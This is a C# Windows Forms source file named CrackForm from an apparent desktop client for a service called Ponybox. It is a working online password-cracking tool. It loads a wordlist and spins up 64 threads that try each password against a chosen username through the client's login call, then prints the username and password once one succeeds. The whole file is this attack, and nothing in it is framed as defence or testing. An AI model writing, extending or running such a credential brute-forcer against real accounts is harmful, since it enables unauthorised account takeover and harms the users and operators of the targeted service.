using PonyboxDesktop.Ponybox;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PonyboxDesktop
{
    public partial class CrackForm : Form
    {
        string[] passwordlist;
        long count = 0;
        long current = 0;
        bool completed;
        string name;

        List<Thread> threadPool = new List<Thread>();
        public CrackForm()
        {
            InitializeComponent();
        }

        private void buttonStart_Click(object sender, EventArgs e)
        {
            name = textBoxUsername.Text;

            passwordlist = File.ReadAllLines("Passwords/uniqpass_preview.txt");

            labelprogress.Text = passwordlist.Length + " passwords to check";

            completed = false;
            current = 0;

            for (int i=0;i<64;i++)
            {
                Thread t = CreateThread(current);
                threadPool.Add(t);
                current++;
                t.Start();
            }
        }

        Thread CreateThread(long id)
        {
            Thread t = new Thread(new ThreadStart(delegate
            {
                if (!completed)
                {
                    string res = PonyboxClient.LoadUser(name, passwordlist[id]);
                    if (res != "")
                    {
                        Console.WriteLine(name + " : " + passwordlist[id]);
                        completed = true;
                    }
                    else
                    {
                        current++;
                        if(current % 10 == 0)
                        {
                            labelprogress.Invoke((MethodInvoker)delegate
                            {
                                labelprogress.Text = current + " / " + passwordlist.Length + " (" + current * 100 / passwordlist.Length + "%)";
                            }); 
                        }
                        NextThread();
                    }
                }

            }));
            return t;
        }

        private void NextThread()
        {
            threadPool.Remove(Thread.CurrentThread);
            Thread t = CreateThread(current);
            current++;
            threadPool.Add(t);
            t.Start();
        }
    }
}
